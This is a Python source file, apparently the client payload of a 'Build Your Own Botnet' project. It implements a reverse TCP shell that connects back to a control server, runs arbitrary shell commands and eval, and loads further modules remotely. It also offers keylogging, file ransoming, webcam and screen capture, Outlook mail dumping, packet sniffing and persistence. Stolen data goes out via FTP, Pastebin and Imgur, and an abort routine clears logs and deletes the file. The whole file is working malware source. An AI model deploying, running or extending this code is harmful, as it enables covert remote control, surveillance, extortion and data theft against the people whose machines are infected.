#!/usr/bin/python
# -*- coding: utf-8 -*-
'Reverse TCP Shell Payload (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import json
import zlib
import uuid
import base64
import ctypes
import ftplib
import struct
import socket
import random
import urllib
import urllib2
import zipfile
import logging
import StringIO
import functools
import threading
import subprocess
import contextlib
import collections
import logging.handlers


def log(info, level='debug'):
    logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
    logger = logging.getLogger(__name__)
    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))

def config(*arg, **options):
    """ 
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
    """
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _config

def threaded(function):
    """ 
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to add a loading animation
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded

# main
_abort = False
_debug = '--debug' in sys.argv

class Payload():
    """ 
    Reverse TCP shell designed to provide remote access
    to the host's terminal, enabling direct control of the
    device from a remote server.

    """

    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
        """ 
        Create a reverse TCP shell instance

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        """
        self.handlers = {}
        self.remote = {'modules': [], 'packages': []}
        self.flags = self._get_flags()
        self.connection = self._get_connection(host, port)
        self.key = self._get_key(self.connection)
        self.info = self._get_info()

    def _get_flags(self):
        return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())

    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
            return getattr(self, cmd)
        return False

    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 30 seconds...")
                time.sleep(30)
                continue
            except Exception as e:
                log("{} error: {}".format(self._get_connection.func_name, str(e)))
                sys.exit()
        self.flags.connection.set()
        return connection

    def _get_key(self, connection):
        if isinstance(connection, socket.socket):
            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
                return globals()['diffiehellman'](connection)
            else:
                raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
        else:
            raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))

    def _get_info(self):
        info = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            try:
                info[function] = globals()[function]()
            except Exception as e:
                log(level='info', info= "'{}' from session info returned error: {}".format(function, str(e)))
        data = globals()['encrypt_aes'](json.dumps(info), self.key)
        msg = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return info

    def _get_resources(self, target=None, base_url=None):
        try:
            if not isinstance(target, list):
                raise TypeError("keyword argument 'target' must be type '{}'".format(list))
            if not isinstance(base_url, str):
                raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
            if not base_url.startswith('http'):
                raise ValueError("keyword argument 'base_url' must start with http:// or https://")
            log(level='info', info= '[*] Searching %s' % base_url)
            path = urllib2.urlparse.urlsplit(base_url).path
            base = path.strip('/').replace('/','.')
            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in target:
                        log(level='info', info= "[+] Adding %s" % module)
                        target.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                    t.daemon = True
                    t.start()
                else:
                    resource = '/'.join((path, n))
                    if resource not in target:
                        target.append(resource)
        except Exception as e:
            log("{} error: {}".format(self._get_resources.func_name, str(e)))

    @threaded
    def _get_resource_handler(self):
        try:
            host, port = self.connection.getpeername()
            self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
            self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
            print(json.dumps(self.remote, indent=2))
        except Exception as e:
            log(str(e))

    @threaded
    def _get_prompt_handler(self):
        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
        while True:
            try:
                self.flags.prompt.wait()
                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
                self.flags.prompt.clear()
                if globals()['_abort']:
                    break
            except Exception as e:
                log(str(e))
                break

    @threaded
    def _get_thread_handler(self):
        while True:
            jobs = self.handlers.items()
            for task, worker in jobs:
                if not worker.is_alive():
                    dead = self.handlers.pop(task, None)
                    del dead
            if globals()['_abort']:
                break
            time.sleep(0.5)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """ 
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)

        """
        if os.path.isdir(path):
            return os.chdir(path)
        else:
            return os.chdir('.')

    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """ 
        List the contents of a directory

        `Optional`
        :param str path:  target directory

        """
        output = []
        if os.path.isdir(path):
            for line in os.listdir(path):
                if len('\n'.join(output + [line])) < 2048:
                    output.append(line)
                else:
                    break
            return '\n'.join(output)
        else:
            return "Error: path not found"

    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """ 
        Display file contents

        `Required`
        :param str path:  target filename

        """
        output = []
        if not os.path.isfile(path):
            return "Error: file not found"
        for line in open(path, 'rb').read().splitlines():
            if len(line) and not line.isspace():
                if len('\n'.join(output + [line])) < 48000:
                    output.append(line)
                else:
                    break
        return '\n'.join(output)

    @config(platfoms=['win32','linux2','darwin'], command=False)
    def ftp(self, source, filetype=None, host=None, user=None, password=None):
        """ 
        Upload file/data to FTP server

        `Required`
        :param str source:    data or filename to upload

        `Optional`
        :param str filetype:  upload file type
        :param str host:      FTP server hostname
        :param str user:      FTP server login user
        :param str password:  FTP server login password

        """
        try:
            for attr in ('host', 'user', 'password'):
                if not locals().get(attr):
                    raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(str(source)):
                path   = source
                source = open(str(path), 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = StringIO.StringIO(bytes(source))
            host = ftplib.FTP(host=host, user=user, password=password)
            addr = urllib2.urlopen('http://api.ipify.org').read()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            stor = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e:
            return "{} error: {}".format(self.ftp.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self, *args):
        """ 
        Show name of present working directory

        """
        return os.getcwd()

    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """ 
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute

        """
        try:
            return eval(code)
        except Exception as e:
            return "{} error: {}".format(self.eval.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """ 
        Download file from url as temporary file and return filepath

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as

        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                log("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"

    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """ 
        Shutdown the current connection and reset session

        """
        try:
            self.flags.connection.clear()
            self.flags.prompt.clear()
            self.connection.close()
            for thread in self.handlers:
                try:
                    self.stop(thread)
                except Exception as e:
                    log("{} error: {}".format(self.kill.func_name, str(e)))
        except Exception as e:
            log("{} error: {}".format(self.kill.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='help [cmd]')
    def help(self, name=None):
        """ 
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module

        """
        if not name:
            try:
                return {getattr(self, cmd).usage: getattr(self, cmd) for cmd in vars(self) if hasattr(getattr(self, cmd), 'command') if getattr(getattr(self, cmd), 'command')}
            except Exception as e:
                log("{} error: {}".format(self.help.func_name, str(e)))
        elif hasattr(self, name):
            try:
                return help(getattr(self, name))
            except Exception as e:
                log("{} error: {}".format(self.help.func_name, str(e)))
        else:
            return "'{}' is not a valid command and is not a valid module".format(name)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
    def load(self, args):
        """ 
        Remotely import a module or package

        `Required`
        :param str module:  name of module/package

        `Optional`
        :param str target:  name of the target destination (default: globals)

        """
        args = str(args).split()
        if len(args) == 1:
            module, target = args[0], ''
        elif len(args) == 2:
            module, target = args
        else:
            return "usage: {}".format(self.load.usage)
        target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
        host, port = self.connection.getpeername()
        base_url_1 = 'http://{}:{}'.format(host, port + 1)
        base_url_2 = 'http://{}:{}'.format(host, port + 2)
        with globals()['remote_repo'](self.remote['modules'], base_url_1):
            with globals()['remote_repo'](self.remote['packages'], base_url_2):
                try:
                    exec 'import {}'.format(module) in target
                    return ('[+] {} remotely imported into {}'.format(module))
                except Exception as e:
                    log("{} error: {}".format(self.load.func_name, str(e)))
                    return ('[-] {} could not be remotely imported into {}'.format(module))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """ 
        Stop a running job

        `Required`
        :param str target:    name of job to stop
        """
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            log("{} error: {}".format(self.stop.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """ 
        Show value of an attribute

        `Required`
        :param str attribute:    payload attribute to show

        Returns attribute(s) as a dictionary (JSON) object
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            log("'{}' error: {}".format(_threads.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self, *args):
        """ 
        Abort tasks, close connection, and self-destruct leaving no trace on the disk

        """
        globals()['_abort'] = True
        try:
            if os.name is 'nt':
                clear_system_logs()
            if 'persistence' in globals():
                global persistence
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            log("{} error: {}".format(method, str(e2)))
            if not _debug:
                delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.connection.close)
            taskkill = threading.Thread(target=self.process, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()

    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """ 
        Unzip a compressed archive/file

        `Required`
        :param str path:    zip archive filename

        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                log("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """ 
        Use an online phone to send text messages

        `Required`
        :param str phone:     recipient phone number
        :param str message:   text message to send

        `Optional`
        :param str account:   Twilio account SID 
        :param str token:     Twilio auth token 
        :param str api:       Twilio api key

        """
        if 'phone' not in globals():
            globals()['phone'] = self.load('phone')
        args = globals()['kwargs'](args)
        if all():
            return globals()['phone'].run(number=args.number, message=args.message, sid=args.sid, token=args.token)
        else:
            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'

    @config(platforms=['win32','linux2','darwin'], command=False)
    def imgur(self, source, api_key=None):
        """ 
        Upload image file/data to Imgur

        `Required`
        :param str source:    data or filename

        """
        try:
            if api_key:
                if not isinstance(api_key, str):
                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
                if not api_key.lower().startswith('client-id'):
                    api_key  = 'Client-ID {}'.format(api_key)
                if 'normalize' in globals():
                    source = normalize(source)
                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
                return str(json.loads(post)['data']['link'])
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self.imgur.func_name, str(e2))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """ 
        Upload file to an FTP server, Imgur, or Pastebin

        `Required`
        :param str mode:      ftp, imgur, pastebin
        :param str source:    data or filename

        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source:
                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
            elif mode not in ('ftp','imgur','pastebin'):
                return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
            else:
                return getattr(self, mode)(source)
        except Exception as e:
            log("{} error: {}".format(self.upload.func_name, str(e)))
            return "Error: {}".format(str(e))

    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """ 
        Ransom personal files on the client host machine using encryption

        `Required`
        :param str mode:        encrypt, decrypt, payment
        :param str target:      target filename or directory path

        """
        if 'ransom' not in globals():
            self.load('ransom')
        return globals()['ransom'].run(args)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """ 
        View a live stream of the client host machine webcam or capture image/video

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur (image mode), ftp (video mode)
        :param int port:      integer 1 - 65355 (stream mode)
        
        """
        try:
            if 'webcam' not in globals():
                self.load('webcam')
            elif not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = globals()['webcam'].stream(port=args[1])
                else:
                    result = globals()['webcam'].image(*args) if 'video' not in args else globals()['webcam'].video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result

    @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
    def passive(self):
        """ 
        Enter passive mode, re-attempting to establish a connection
        with the server every 30 seconds

        """
        self.flags['connection'].clear()
        self._get_connection()
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """ 
        Restart the shell

        """
        try:
            log("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            log("{} error: {}".format(self.restart.func_name, str(e)))

    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """ 
        Access Outlook email in the background without authentication

        `Required`
        :param str mode:    count, dump, search, results

        `Optional`
        :param int n:       target number of emails (upload mode only)

        """
        if 'outlook' not in globals():
            self.load('outlook')
        elif not args:
            try:
                if not globals()['outlook'].installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(globals()['outlook'] % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self.handlers['outlook'] = threading.Thread(target=getattr(globals()['outlook'], mode), kwargs={'n': arg}, name=time.time())
                        self.handlers['outlook'].daemon = True
                        self.handlers['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(globals()['outlook'], mode):
                        return getattr(globals()['outlook'], mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                log("{} error: {}".format(self.email.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """ 
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program
        
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    log("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))

    @config(platforms=['win32'], command=True, usage='process <mode>')
    def process(self, args=None):
        """ 
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search

        `Optional`
        :param str args:    arguments specific to the mode
        
        """
        try:
            if 'process' not in globals():
                self.load('process')
            if not args:
                if hasattr(globals()['process'], 'usage'):
                    return globals()['process'].usage
                elif hasattr(self.process, 'usage'):
                    return self.process.usage
                else:
                    return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
            cmd, _, action = str(args).partition(' ')
            if hasattr(globals()['process'], cmd):
                return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
            else:
                return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
        except Exception as e:
            log("{} error: {}".format(self.process.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
    def portscan(self, args=None):
        """ 
        Scan a target host or network to identify 
        other target hosts and open ports.

        `Required`
        :param str mode:        host, network
        :param str target:      IPv4 address
        
        """
        if 'portscanner' not in globals():
            self.load('portscanner')
        try:
            if not args:
                return 'portscan <mode> <target>'
            mode, _, target = str(args).partition(' ')
            if not mode:
                return 'portscan <mode> <target>'
            if target:
                if not ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(globals()['portscanner'], mode):
                return getattr(globals()['portscanner'], mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            log("{} error: {}".format(self.portscan.func_name, str(e)))

    def pastebin(self, source, api_key=None):
        """ 
        Dump file/data to Pastebin

        `Required`
        :param str source:      data or filename

        `Optional`
        :param str api_key:     Pastebin api_dev_key

        Returns URL of pastebin document as a string
        
        """
        try:
            if api_key:
                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
                parts = urllib2.urlparse.urlsplit(paste)       
                return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
            else:
                return "{} error: no pastebin API key".format(self.pastebin.func_name)
        except Exception as e:
            return '{} error: {}'.format(self.pastebin.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """ 
        Log user keystrokes

        `Required`
        :param str mode:    run, stop, status, upload, auto
        
        """
        def status():
            try:
                mode    = 'stopped'
                if 'keylogger' in self.handlers:
                    mode= 'running'
                update  = status(float(self.handlers.get('keylogger').name))
                length  = globals()['keylogger']._buffer.tell()
                return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
            except Exception as e:
                log("{} error: {}".format('keylogger.status', str(e)))
        if 'keylogger' not in globals():
            self.load('keylogger')
        elif not mode:
            if 'keylogger' not in self.handlers:
                return globals()['keylogger'].usage
            else:
                return locals()['status']()
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in self.handlers:
                    self.handlers['keylogger'] = globals()['keylogger'].run()
                    return locals()['status']()
                else:
                    return locals()['status']()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return locals()['status']()
            elif 'auto' in mode:
                self.handlers['keylogger'] = globals()['keylogger'].auto()
                return locals()['status']()
            elif 'upload' in mode:
                result = self.pastebin(globals()['keylogger']._buffer) if not 'ftp' in mode else self.ftp(globals()['keylogger']._buffer)
                globals()['keylogger']._buffer.reset()
                return result
            elif 'status' in mode:
                return locals()['status']()        
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'

    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
    def screenshot(self, mode=None):
        """ 
        Capture a screenshot from host device

        `Optional`
        :param str mode:   ftp, imgur (default: None)
        
        """
        try:
#            if 'mss' not in globals():
#                self.load('mss')
#            with mss.mss() as screen:
#                img = screen.grab(screen.monitors[0])
#            return globals()['png'](img)
            if 'screenshot' not in globals():
                self.load('screenshot')
            return globals()['screenshot'].run()
        except Exception as e:
            result = "{} error: {}".format(self.screenshot.func_name, str(e))
            log(result) 
            return result

    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """ 
        Establish persistence on client host machine

        `Required`
        :param str target:    run, abort, methods, results

        `Methods`
        :method all:                All Methods
        :method registry_key:       Windows Registry Key
        :method scheduled_task:     Windows Task Scheduler
        :method startup_file:       Windows Startup File
        :method launch_agent:       Mac OS X Launch Agent
        :method crontab_job:        Linux Crontab Job
        :method hidden_file:        Hidden File
        
        """
        try:
            if not 'persistence' in globals():
                self.load('persistence')
            methods = globals()['persistence'].methods() + ['all']
            cmd, _, action = str(args).partition(' ')
            if cmd not in ('add','remove') or action not in methods:
                return self.persistence.usage + str('\nmethods: %s' % ', '.join(methods))
            for method in methods:
                if action == 'all' or action == method:
                    getattr(globals()['persistence'].methods[method], cmd)()
            return json.dumps(persistence.results())
        except Exception as e:
            log("{} error: {}".format(self.persistence.func_name, str(e)))

    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """ 
        Capture traffic on local network

        `Required`
        :param str mode:        ftp, pastebin
        :param int seconds:     duration in seconds
        
        """
        try:
            if 'packetsniffer' not in globals():
                self.load('packetsniffer')
            args = globals()['kwargs'](args)
            if 'mode' not in args or args['mode'] not in ('ftp', 'pastebin'):
                return "keyword argument 'mode' is missing or invalid (use 'ftp' or 'pastebin')"
            else:
                mode = args['mode']
            if 'time' not in args or not str(args['time']).isdigit():
                length = 30
            else:
                length = args['time']
            self.handlers['packetsniffer'] = globals()['packetsniffer'](mode, seconds=length)
            return 'Capturing network traffic for {} seconds and uploading via {}'.format(length, mode)
        except Exception as e:
            log("{} error: {}".format(self.packetsniffer.func_name, str(e)))

    def send_task(self, task):
        """ 
        Send task results to the server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr str session:         session ID assigned by server
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        try:
            if not 'session' in task:
                task['session'] = self.info.get('uid')
            if self.flags.connection.wait(timeout=1.0):
                data = globals()['encrypt_aes'](json.dumps(task), self.key)
                msg  = struct.pack('!L', len(data)) + data
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            log("{} error: {}".format(self.send_task.func_name, str(e)))

    def recv_task(self):
        """ 
        Receive and decrypt incoming task from server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str session:         client ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        """
        try:
            hdr_len = struct.calcsize('!L')
            hdr = self.connection.recv(hdr_len)
            msg_len = struct.unpack('!L', hdr)[0]
            msg = self.connection.recv(msg_len)
            data = globals()['decrypt_aes'](msg, self.key)
            return json.loads(data)
        except Exception as e:
            log("{} error: {}".format(self.recv_task.func_name, str(e)))

    def run(self):
        """ 
        Connect back to server via outgoing connection
        and initialize a reverse TCP shell

        """
        for target in ('resource_handler','prompt_handler','thread_handler'):
            if not bool(target in self.handlers and self.handlers[target].is_alive()):
                self.handlers[target] = getattr(self, '_get_{}'.format(target))()
        while True:
            if self.flags.connection.wait(timeout=1.0):
                if not self.flags.prompt.is_set():
                    task = self.recv_task()
                    if isinstance(task, dict) and 'task' in task:
                        cmd, _, action = task['task'].encode().partition(' ')
                        try:
                            command = self._get_command(cmd)
                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                        except Exception as e:
                            result = "{} error: {}".format(self.run.func_name, str(e))
                            log(level='debug', info=result)
                        task.update({'result': result})
                        self.send_task(task)
                    self.flags.prompt.set()
            else:
                log("Connection timed out")
                break
